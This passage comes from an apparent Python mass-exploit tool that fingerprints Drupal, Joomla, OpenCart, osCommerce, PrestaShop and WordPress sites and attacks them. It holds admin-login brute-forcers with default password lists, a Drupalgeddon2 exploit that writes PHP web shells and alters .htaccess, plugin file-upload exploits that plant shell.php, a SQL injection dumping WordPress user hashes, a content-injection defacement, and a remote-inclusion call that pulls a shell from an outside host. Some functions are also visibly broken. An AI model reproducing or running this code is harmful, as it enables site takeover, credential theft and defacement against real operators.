		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[94m Drupal  " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		#3
		fckeditor(url)
		drupalsqliadmin(url)
		drupalgedden2(url)
		drupalbf(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")
	elif '/osc/catalog/' in cmschecker.text:
		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[94m osCommerce  " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		#1
		fckeditor(url)
		oscommerce(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")
	elif 'prestashop' in checker.text:
		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[94m Prestashop  " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		#12
		fckeditor(url)
		lib(url)
		psmodthemeoptionpanel(url)
		megamenu(url)
		nvn_export_orders(url)
		pkflexmenu(url)
		wdoptionpanel(url)
		fieldvmegamenu(url)
		wg24themeadministration(url)
		videostab(url)
		cartabandonmentpro(url)
		cartabandonmentproOld(url)
		columnadverts(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")
	elif 'catalog/view/' in cmschecker.text:
		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[94m OpenCart  " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		#1
		fckeditor(url)
		opencart(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")
	else:
		print ("\033[97m[\033[96m~\033[97m] \033[93m" + url + "\033[34m [" + "\033[91m Unknown " + "\033[34m] \033[0m")
		print ("\033[97m-----------------------------------------------")
		print ("\033[97m[\033[93m+\033[97m] \033[97m" + "Lets Check Vulnerability")
		#1
		fckeditor(url)
		print ""
		usetool1()
		print ("\033[97m-----------------------------------------------")

### Exploit ----------------------------------------------------------------------->>>>>>>
class drupalbf(object):
        def __init__(self, url):
            red = '\033[31m'
            green = '\033[32m'
            yellow = '\033[33m'
            blue = '\033[34m'
            pink = '\033[35m'
            cyan = '\033[36m'
            white = '\033[37m'
            end = '\033[0m'
            whinew = '\033[97m'
            cyannew = '\033[96m'
            purnew = '\033[95m'
            bluenew = '\033[94m'
            yelnew = '\033[93m'
            grenew = '\033[92m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.Drupal, args=(url, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print (whinew + "   [" + yelnew + "-" + whinew + "]" + purnew + " " + grenew + "Drupal BruteForce" + whinew + " [" + rednew + "NotVuln" + whinew + "]")

        def Drupal(self, url, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                sess = requests.session()
                GetToken = sess.get('http://' + url + '/user/login', timeout=5, headers=agent)
                try:
                    GetOP = re.findall('id="edit-submit" name="op" value="(.*)"',
                                       GetToken.text)[0].split('"')[0]
                except:
                    GetOP = 'Log in'
                post = {}
                post['name'] = "admin"
                post['pass'] = passwd
                post['form_id'] = 'user_login'
                post['op'] = GetOP
                url = "http://" + url + "/user/login"
                GoT = sess.post(url, data=post, headers=agent, timeout=10)
                if 'Log out' in GoT.text:
                    print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Getting UserPass")
                    print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Username : " + whinew + "admin")
                    print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Password : " + whinew + passwd)
                    self.flag = 1
            except:
                pass

class opencart(object):
        def __init__(self, url):
            red = '\033[31m'
            green = '\033[32m'
            yellow = '\033[33m'
            blue = '\033[34m'
            pink = '\033[35m'
            cyan = '\033[36m'
            white = '\033[37m'
            end = '\033[0m'
            whinew = '\033[97m'
            cyannew = '\033[96m'
            purnew = '\033[95m'
            bluenew = '\033[94m'
            yelnew = '\033[93m'
            grenew = '\033[92m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.opencart, args=(url, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print (whinew + "   [" + yelnew + "-" + whinew + "]" + purnew + " " + grenew + "OpenCart" + whinew + " [" + rednew + "NotVuln" + whinew + "]")

        def opencart(self, url, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                post = {}
                post['username'] = "admin"
                post['password'] = passwd
                allurl = "http://" + url + "/admin/index.php"
                GoT = requests.post(allurl, data=post, headers=agent, timeout=10)
                if 'Logout' in GoT.text:
                    print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Getting UserPass")
                    print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Username : " + whinew + "admin")
                    print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Password : " + whinew + passwd)
                    self.flag = 1
            except:
                pass

class joomlabf(object):
        def __init__(self, url):
            red = '\033[31m'
            green = '\033[32m'
            yellow = '\033[33m'
            blue = '\033[34m'
            pink = '\033[35m'
            cyan = '\033[36m'
            white = '\033[37m'
            end = '\033[0m'
            whinew = '\033[97m'
            cyannew = '\033[96m'
            purnew = '\033[95m'
            bluenew = '\033[94m'
            yelnew = '\033[93m'
            grenew = '\033[92m'
            self.password = ["admin", "demo", "admin123", "123456", "123456789", "123", "1234", "12345", "1234567", "12345678",
                        "123456789", "admin1234", "admin123456", "pass123", "root", "321321", "123123", "112233", "102030",
                        "password", "pass", "qwerty", "abc123", "654321", "pass1234", "abc1234", "demo1", "demo2",
                        "demodemo", "site", "shop", "password123", "admin1", "admin12", "adminqwe", "test", "test123", "1",
                        "12", "123123"]
            thread = []
            for passwd in self.password:
                t = threading.Thread(target=self.Joomla, args=(url, passwd))
                if self.flag == 1:
                    break
                else:
                    t.start()
                    thread.append(t)
                    time.sleep(0.08)
            for j in thread:
                j.join()
            if self.flag == 0:
                print (whinew + "   [" + yelnew + "-" + whinew + "]" + purnew + " " + grenew + "Joomla BruteForce" + whinew + " [" + rednew + "NotVuln" + whinew + "]")

        def Joomla(self, url, passwd):
            try:
                agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                sess = requests.session()
                GetToken = sess.get('http://' + url + '/administrator/index.php', timeout=5, headers=agent)
                try:
                    ToKeN = re.findall('type="hidden" name="(.*)" value="1"',
                                       GetToken.text)[0]
                    GeTOPtIoN = re.findall('type="hidden" name="option" value="(.*)"', GetToken.text)[0]
                except:
                    ToKeN = ''
                    GeTOPtIoN = 'com_login'
                post = {}
                post['username'] = "admin"
                post['passwd'] = passwd
                post['lang'] = 'en-GB'
                post['option'] = GeTOPtIoN
                post['task'] = 'login'
                post[ToKeN] = '1'
                url = "http://" + url + "/administrator/index.php"
                GoT = sess.post(url, data=post, headers=agent, timeout=10)
                if 'logout' in GoT.text and '/index.php?option=com_users&amp;task=user.edit' in GoT.text:
                	print (whinew + "	[" + yelnew + "+" + whinew + "]" + purnew + " Getting UserPass")
                	print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Username : " + whinew + "admin")
                	print (whinew + "		[" + yelnew + "+" + whinew + "]" + cyannew + " Password : " + whinew + passwd)
                	self.flag = 1
            except:
                pass


class drupalgedden2(object):
        def __init__(self, url):
            red = '\033[31m'
            green = '\033[32m'
            yellow = '\033[33m'
            blue = '\033[34m'
            pink = '\033[35m'
            cyan = '\033[36m'
            white = '\033[37m'
            end = '\033[0m'
            whinew = '\033[97m'
            cyannew = '\033[96m'
            purnew = '\033[95m'
            bluenew = '\033[94m'
            yelnew = '\033[93m'
            grenew = '\033[92m'
            self.Headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
            try:
                CheckVersion = requests.get('http://' + url, timeout=5, headers=self.Headers)
                if 'content="Drupal 7' in CheckVersion.text:
                    self.Version7Drupal(url)
                elif 'content="Drupal 8' in CheckVersion.text:
                    self.Version8Drupal(url)
                else:
                    self.Version7Drupal(url)
            except:
                self.Print_NotVuln('Drupalgeddon2', url)

        def Print_NotVuln(self, yggagal):
            print (whinew + "   [" + yelnew + "-" + whinew + "]" + purnew + " " + grenew + yggagal + whinew + " [" + rednew + "NotVuln" + whinew + "]")

        def Print_Vuln_index(self, pathindex):
            print (whinew + "		[" + yelnew + "+" + whinew + "]" + purnew + " Index Uploaded" + grenew + pathindex)

        def Print_vuln_Shell(self, pathshell):
            print (whinew + "		[" + yelnew + "+" + whinew + "]" + purnew + " Shell Uploaded" + grenew + pathshell)

        def Version7Drupal(self, url):
            try:
                payloadshell = "Vuln!!<?php system($_GET['cmd']); ?>"
                PrivatePAyLoad = "echo 'Vuln!! patch it Now!' > vuln.htm;" \
                             " echo '" + payloadshell + "'> sites/default/files/vuln.php;" \
                                                        " echo '" + payloadshell + "'> vuln.php;" \
                                                        " cd sites/default/files/;" \
                                                        " echo 'AddType application/x-httpd-php .jpg' > .htaccess;" \
                                                        " echo '" + payloadshell + "'> up.php;"
                get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                              'name[#markup]': PrivatePAyLoad, 'name[#type]': 'markup'}
                post_params = {'form_id': 'user_pass', '_triggering_element_name': 'name'}

                r = requests.post('http://' + url, data=post_params, params=get_params, headers=self.Headers)
                m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
                if m:
                    found = m.group(1)
                    get_params = {'q': 'file/ajax/name/#value/' + found}
                    post_params = {'form_build_id': found}
                    requests.post('http://' + url, data=post_params, params=get_params, headers=self.Headers)
                    a = requests.get('http://' + url + '/sites/default/files/vuln.php',
                                     timeout=5, headers=self.Headers)
                    if 'Vuln!!' in a.text:
                        self.Print_vuln_Shell(url + '/sites/default/files/vuln.php?cmd=id')
                        gg = requests.get('http://' + url + '/vuln.htm', timeout=5, headers=self.Headers)
                        CheckUploader = requests.get('http://' + url + '/sites/default/files/up.php',
                                                     timeout=5, headers=self.Headers)
                        if 'Vuln!!' in CheckUploader.text:
                            self.Print_vuln_Shell(url + '/sites/default/files/up.php')
                        if 'Vuln!!' in gg.text:
                            self.Print_Vuln_index(url + '/vuln.htm')
                    else:
                        gg = requests.get('http://' + url + '/vuln.htm', timeout=5, headers=self.Headers)
                        if 'Vuln!!' in gg.text:
                            self.Print_Vuln_index(url + '/vuln.htm')
                            Checkshell = requests.get('http://' + url + '/vuln.php', timeout=5, headers=self.Headers)
                            if 'Vuln!!' in Checkshell.text:
                                self.Print_vuln_Shell(url + '/vuln.php?cmd=id')
                        else:
                            self.Print_NotVuln('Drupalgeddon2')
                else:
                    self.Print_NotVuln('Drupalgeddon2')
            except:
                self.Print_NotVuln('Drupalgeddon2 Timeout!')



def path(zzz):
        try:
            find = re.findall(',"(.*)","', zzz)
            path = find[0].strip()
            return path
        except:
            pass


def fckeditor(url):
	path = '/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media'
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	try:
		checking = requests.get('http://' + url + path, timeout=50, headers=header)
		if 'OnUploadCompleted(202' in checking.text:
			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
			allpath = 'http://' + url + path
			post = {'Content_Type': 'form-data'}
			file = {'NewFile': open('module/gas.gif', 'rb')}
			req = requests.post(allpath, data=post, headers=headers, timeout=50, files=file)
			if '.gif' in req.text:
				burp = path(req.text)
				akhir = 'http://' + url + str(burp)
				checkakhir = requests.get(akhir, timeout=50, headers=header)
				if checkakhir.status_code == 200:
					benar = requests.get(checkakhir, timeout=50, headers=header)
					if 'GIF89a' in benar.txt:
						vuln('FckEditor')
						berhasil(url + str(burp))
					else:
						gagal('FckEditor')
				else:
					gagal('FckEditor')
			else:
				gagal('FckEditor')
		else:
			gagal('FckEditor')
	except:
		gagal('FckEditor')

def cherry(url):
	shellnya = {'file': (open('module/shell.php', 'rb') , 'multipart/form-data')}
	allurl = 'http://' + url + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	requests.post(allurl, shellnya, headers=header).text
	resp = 'http://' + url + '/wp-content/plugins/cherry-plugin/admin/import-export/shell.php'
	gas = requests.get(resp, headers=header)
	if gas.status_code == 200:
		checkshell = requests.get('http://' + url + '/wp-content/shell.php', timeout=50, headers=header)
		checkindex = requests.get('http://' + url + '/shell.php', timeout=50, headers=header)
		if checkshell.status_code == 200:
			vuln('Cherry_plugins')
			hasilshell('http://' + url + '/wp-content/shell.php')
		elif checkindex.status_code == 200:
			vuln('Cherry_plugins')
			hasilindex('http://' + url + '/shell.php')
		else:
			gagal('Wp-Cherry')
	else:
		gagal('Wp-Cherry')

def wysija(url):
	shell = {'my-theme': open('module/shell.php', 'rb')}
	tipe = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on", 'page': 'GZNeFLoZAb'}
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	allurl = "http://" + url + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
	gas = requests.post(allurl, files=shell, data=tipe, headers=header, timeout=50)
	if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in gas.text:
		hasil = 'http://' + url + '/wp-content/uploads/wysija/themes/shell.php'
		checkhasil = requests.get(hasil, headers=header, timeout=50)
		if "shell" in checkhasil.text:
			vuln('WysijaExploit')
			hasilshell('http://' + url + '/wp-content/uploads/wysija/themes/shell.php')
		else:
			gagal('Wp-Wysija')
	else:
		gagal('Wp-Wysija')

def wp_fronted(url):
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	checking = requests.get('http://' + url + '/wp-admin/admin-ajax.php?action=wpuf_file_upload', headers=header, timeout=10)
	if checking.status_code == 200:
		post = {}
		tahun = time.strftime("%y")
		bulan = time.strftime("%y")
		header1 = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
		post['action'] = 'wpuf_file_upload'
		files = {'wpuf_file': open('module/shell.php', 'rb')}
		try:
			fullurl = 'http://' + url + '/wp-admin/admin-ajax.php'
			gasurl = requests.post(fullurl, files=files, data=post, headers=header1, timeout=50)
			if 'shell' in gasurl.text:
				vuln('wp-Fronted')
				hasilshell('http://' + url + '/wp-admin/admin-ajax.php')
			else:
				gagal('wp-Fronted')
		except:
			gagal('wp-Fronted')
	else:
		gagal('wp-Fronted')
				
def hdwebplayer(url):
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	checking = requests.get('http://' + url + '/wp-content/plugins/hd-webplayer/playlist.php', timeout=50, headers=header)
	if '<?xml version="' in checking.text:
		payload = '/wp-content/plugins/hd-webplayer/playlist.php?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass),4,5,6,7,8,9,10,11+from+wp_users--'
		checklagi = requests.get('http://' + url + payload, headers=header, timeout=50)
		up = re.findall('<title>(.*)</title>', checklagi.text)
		username = up[1].split(':')[0]
		password = up[1].split(':')[0]
		vuln('HD_webPlayer')
		userpass(username, userpass)
	else:
		gagal('HD_webPlayer')

def addblocker(url):
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	shellnya = {'popimg': open('module/shell.php', 'rb')}	
	fullurl = 'http://' + url + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
	gasken = requests.post(fullurl, files=shellnya, headers=header, timeout=50)
	tahun = time.strftime("%y")
	bulan = time.strftime("%y")
	checkpulak = 'http://' + url + '/wp-content/uploads/20' + tahun + '/' + bulan + '/' + 'shell.php'
	gaslur = requests.get(checkpulak, headers=header, timeout=50)
	if gaslur.status_code == 200:
		checkshell = requests.get('http://' + url + '/wp-content/shell.php', headers=header, timeout=50)
		checkindex = requests.get('http://' + url + '/shell.php', headers=header, timeout=50)
		if checkshell.status_code == 200:
			vuln('AddBlocker')
			hasilshell('http://' + url + '/wp-content/shell.php')
		elif checkindex.status_code == 200:
			vuln('AddBlocker')
			hasilshell('http://' + url + '/wp-content/shell.php')
		else:
			gagal('AddBlocker')
	else:
		gagal('AddBlocker')

def fromcraft(url):
	filetry = {'files[]': open('module/auto.php', 'rb')}
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	jajal = 'http://' + url + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
	tryer = requests.get(jajal, headers=header, timeout=50)
	if '"failed"' in tryer.text:
		gas = requests.post(jajal, files=filetry, headers=header, timeout=50)
		if 'new_name' in gas.text:
			golek = re.findall('"new_name":"(.*)",', gas.text)
			index = url + '/wp-content/plugins/formcraft/file-upload/server/content/files/' + golek[0].split('"')[0]
			ngecek = requests.get(index, headers=header, timeout=50)
			if ngecek.status_code == 200:
				ndishell = requests.get('http://' + url + '/wp-content/shell.php')
				ndiindex = requests.get('http://' + url + '/shell.php')
				if ndishell.status_code == 200:
					vuln('FromCraft')
					hasilshell('http://' + url + '/wp-content/shell.php')
				elif ndiindex.status_code == 200:
					vuln('FromCraft')
					hasilshell('http://' + url + '/shell.php')
				else:
					gagal('FromCraft')
			else:
				gagal('FromCraft')
		else:
			gagal('FromCraft')
	else:
		gagal('FromCraft')

def pageline(url):
	filee = {'file': open('module/auto.php', 'rb')}
	postane = {'settings_upload': "settings", 'page': "pagelines"}
	allurl = "http://" + url + "/wp-admin/admin-post.php"
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	gaslah = requests.post(allurl, files=filee, data=postane, headers=header, timeout=50)
	if gaslah.status_code == 200:
		ndishelle = requests.get('http://' + url + '/wp-content/auto.php')
		if ndishelle.status_code == 200:
			vuln('PageLinesExploit')
			hasilshell('http://' + url + '/wp-content/auto.php')
		else:
			gagal('PageLinesExploit')
	else:
		gagal('PageLinesExploit')

def headway(url):
	tema = requests.get('http://' + url + '/wp-content/themes/headway')
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	if tema.status_code == 200:
		path = re.findall('/wp-content/themes/(.*)/style.css', tema.text)
		filejajale = {'Filedata': open(self.pagelinesExploitShell, 'rb')}
		mbuh = "http://" + url + "/wp-content/themes/" + path[0] + "/library/visual-editor/lib/upload-header.php"
		getkok = requests.get(mbuh, headers=header, timeout=50)
		if getkok.status_code == 200:
			kekno = requests.post(mbuh, files=filejajale, headers=header, timeout=50)
			if kekno.status_code == 200:
				shelle = 'http://' + url + '/wp-content/uploads/headway/header-uploads/auto.php/'
				requests.get(shelle, headers=header, timeout=50)
				shelle = requests.get(shelle, headers=header, timeout=50)
				if "Vuln!!" in shelle.text:
					vuln('HeadwayLinesExploit')
					hasilshell('http://' + url + '/wp-content/vuln.php')
				else:
					gagal('HeadwayLinesExploit')
			else:
				gagal('HeadwayLinesExploit')
		else:
			gagal('HeadwayLinesExploit')
	else:
		gagal('HeadwayLinesExploit')

def wp_mobile(url):
	shell = '/wp-content/plugins/wp-mobile-detector/resize.php?src=http://40k.waszmann.de/Deutsch/images/settings_auto.php'
	extensi = '/wp-content/plugins/wp-mobile-detector/resize.php'
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	gasdikek = requests.get('http://' + url + extensi, headers=header, timeout=50)
	if gasdikek.status_code == 200:
		requests.get('http://' + url + shell, headers=header, timeout=50)
		pathshell = '/wp-content/plugins/wp-mobile-detector/cache/settings_auto.php'
		ke1 = 'http://' + url + pathshell
		mb = requests.get(ke1, headers=header, timeout=50)
		if mb.status_code == 200:
			vuln('Wp-Mobile-Detector')
			hasilshell("http://" + url + "/wp-content/vuln.php")
		else:
			gagal('Wp-Mobile-Detector')
	else:
		gagal('Wp-Mobile-Detector')

def wp_job(url):
	ex = '/jm-ajax/upload_file/'
	j = requests.get('http://' + url + ex)
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	if j.status_code == 200:
		file = {'file[]': open('module/shell.php', 'rb')}
		gas = requests.post('http://' + url + ex, data=file, headers=header, timeout=50)
		gg = re.findall('"url":"(.*)"', gas.text)
		ggg = gg[0].split('"')[0].replace('\/', '/').split('/wp-content')[1]
		uploadindex = 'http://' + url + ggg
		check = requests.get(uploadindex, headers=header, timeout=50)
		if check.status_code == 200:
			vuln('Wp-Job-Manager')
			hasilshell(uploadindex)
		else:
			gagal('Wp-Job-Manager')
	else:
		gagal('Wp-Job-Manager')

def wpid(zzz):
        try:
            post = requests.get('http://' + zzz + '/wp-json/wp/v2/posts/', timeout=5, headers=self.Headers)
            wsx = re.findall('"id":(.+?),"date"', post.text)
            postid = wsx[1].strip()
            return postid
        except:
            pass

def wp_content_injection(url):
	bem = wpid(url)
	headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	date = str(bem) + 'bbx'
	header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0', 'Accept': '*/*'}
	data = json.dumps({
                'content': '<h1>Vuln!! Path it now!!\n<p><title>Vuln!! Path it now!!<br />\n</title></p></h1>\n',
                'title': 'Vuln!! Path it now!!',
                'id': date,
                'link': '/x-htm/',
                'slug': '"/x-htm/"'
                })
	gas = requests.post('http://' + url + '/wp-json/wp/v2/posts/' + str(bem), data=data, headers=headers, timeout=50)
	if gas:
		indek = 'http://' + url + '/x.htm'
		checkneh = requests.get(indek, timeout=50, headers=headers)
		if 'Vuln!!' in checkneh.text:
			vuln('Wp-Content-Injection')
			hasilshell('http://' + url + '/x.htm')
		else:
			gagal('Wp-Content-Injection')
	else:
		gagal('Wp-Content-Injection')

def viral_option(url):
	file = {'Filedata': open('module/vuln.txt', 'rb')}
	headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	req = requests.post('http://' + url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php', files=file, headers=headers)
	if 'id="wpvimgres"' in req.text:
		tahun = time.strftime("%y")
		bulan = time.strftime("%y")
		fullurl = url +  '/wp-content/uploads/20' + tahun + '/' + bulan + '/' + 'vuln.text'
		golek = re.findall('<img src="http://(.*)" height="', req.text)
		intok = requests.get('http://' + find[0], timeout=50, headers=headers)
		if 'vuln' in intok.text:
			vuln('Viral-Option')
			hasiltext('http://' + url +  '/wp-content/uploads/20' + tahun + '/' + bulan + '/' + 'vuln.text')
		else:
			gagal('Viral-Option')
	else:
		gagal('Viral-Option')

def woocomerce(url):
	path = 'http://' + url + '/wp-admin/admin-ajax.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	data = {'action': 'nm_personalizedproduct_upload_file', 'name': 'upload.php'}
	pele = {'file': open('module/auto.php', 'rb')}
	gas = requests.post(path, files=pele, data=data, headers=header, timeout=50)
	if gas.status_code == 200:
		checkupload = 'http://' + url + '/wp-content/uploads/product_files/upload.php'
		checkneh = requests.get(checkupload, headers=header, timeout=50)
		if 'Vuln!!' in checkneh.text:
			shellChecker = requests.get('http://' + url + '/wp-content/vuln.php', timeout=50, headers=header)
			if 'Vuln!!' in shellChecker.text:
				vuln('WooComerce')
				hasilshell('http://' + url + '/wp-content/vuln.php')
			else:
				gagal('WooComerce')
		else:
			gagal('WooComerce')
	else:
		gagal('WooComerce')

def categorypageicon(url):
	al = requests.get('http://' + url + '/wp-content/plugins/category-page-icons/css/menu.css')
	if al.status_code == 200:
		kabyeh = 'http://' + url + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php'
		file = {'wpdev-async-upload': open('module/shell.php', 'rb')}
		post = {'dir_icons': '../../../', 'submit': 'upload'}
		header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
		requests.post(kabyeh, files=file, data=post, headers=header, timeout=50)
		cek = requests.get('http://' + url + '/wp-content/shell.php')
		if cek.status_code == 200:
			vuln('Category-Page-Icon')
			hasilshell('http://' + url + '/wp-content/shell.php')
		else:
			gagal('Category-Page-Icon')
	else:
		gagal('Category-Page-Icon')

def comads(url):
	fil = {'file': open('module/shell.php', 'rb')}
	post = {"name": 'module/shell.php'.split('/')[1]}
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	al = 'http://' + url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
	gas = requests.post(al, files=fil, data=post, headers=header, timeout=50)
	if '"jsonrpc"' in gas.text:
		check = requests.get('http://' + url + '/tmp/plupload/' + 'shell.php'.split('/')[1], timeout=50, headers=header)
		if check.status_code == 200:
			vuln('Com_AdsManager')
			hasilshell('http://' + url + '/tmp/plupload/' + 'shell.php')
		else:
			gagal('Com_AdsManager')
	else:
		gagal('Com_AdsManager')


def comadsmanager(url):
	filee = {'file': open('module/index.jpg', 'rb')}
	datane = {"name": "vuln.php"}
	kabeh = 'http://' + url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	gaskek = requests.post(kabeh, files=filee, data=datane, headers=header, timeout=50)
	if '"jsonrpc"' in gaskek.text:
		requests.post(kabeh, files=filee, data={"name": "iso.phP"}, timeout=50, headers=header)
		requests.post(kabeh, files=filee, data={"name": "iso.phtml"}, timeout=50, headers=header)
		requests.post(kabeh, files=filee, data={"name": "iso.php"}, timeout=50, headers=header)
		ke1 = requests.get('http://' + url + '/tmp/plupload/iso.phP', timeout=5, headers=header)
		ke2 = requests.get('http://' + url + '/tmp/plupload/iso.phtml', timeout=5, headers=header)
		ke3 = requests.get('http://' + url + '/tmp/plupload/iso.php', timeout=5, headers=header)
		shell1 = requests.get('http://' + url + '/images/vuln.php', headers=header, timeout=50)
		shell2 = requests.get('http://' + url + '/vuln.php', headers=header, timeout=50)
		if ke1.status_code == 200:
			if shell1.status_code == 200:
				vuln('Com_AdsManager')
				hasilshell('http://' + url + '/images/vuln.php')
			elif shell2.status_code == 200:
				vuln('Com_AdsManager')
				hasilshell('http://' + url + '/vuln.php')
			else:
				comads(url)
		elif ke2.status_code == 200:
			if shell1.status_code == 200:
				vuln('Com_AdsManager')
				hasilshell('http://' + url + '/images/vuln.php')
			elif shell2.status_code == 200:
				vuln('Com_AdsManager')
				hasilshell('http://' + url + '/vuln.php')
			else:
				comads(url)
		elif ke3.status_code == 200:
			if shell1.status_code == 200:
				vuln('Com_AdsManager')
				hasilshell('http://' + url + '/images/vuln.php')
			elif shell2.status_code == 200:
				vuln('Com_AdsManager')
				hasilshell('http://' + url + '/vuln.php')
			else:
				comads(url)
		else:
			gagal('Com_AdsManager')
	else:
		gagal('Com_AdsManager')


def alberghi(url):
	shell = {'userfile': open('module/shell.php', 'rb')}
	allurl = 'http://' + url + '/administrator/components/com_alberghi/upload.alberghi.php'
	header = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	gas = requests.get(allurl, timeout=50, headers=header)
